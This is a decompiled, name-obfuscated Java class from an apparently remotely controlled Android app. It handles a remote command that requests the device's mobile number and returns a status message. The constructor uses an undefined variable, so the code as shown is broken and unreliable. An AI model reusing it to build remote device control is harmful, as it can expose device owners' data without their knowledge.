package com.vvt.remotecommand.processor.misc;

import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.b;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.a;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class m
  extends b
{
  public m(a parama)
  {
    super(parama, false, localRemoteFunction);
  }
  
  protected String a(Object paramObject)
  {
    String str = null;
    boolean bool = paramObject instanceof RmtCtrlOutputStatusMessage;
    if (bool)
    {
      paramObject = (RmtCtrlOutputStatusMessage)paramObject;
      str = ((RmtCtrlOutputStatusMessage)paramObject).getMessage();
    }
    return str;
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcRequestMobileNumber";
  }
  
  public boolean f()
  {
    return false;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/misc/m.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */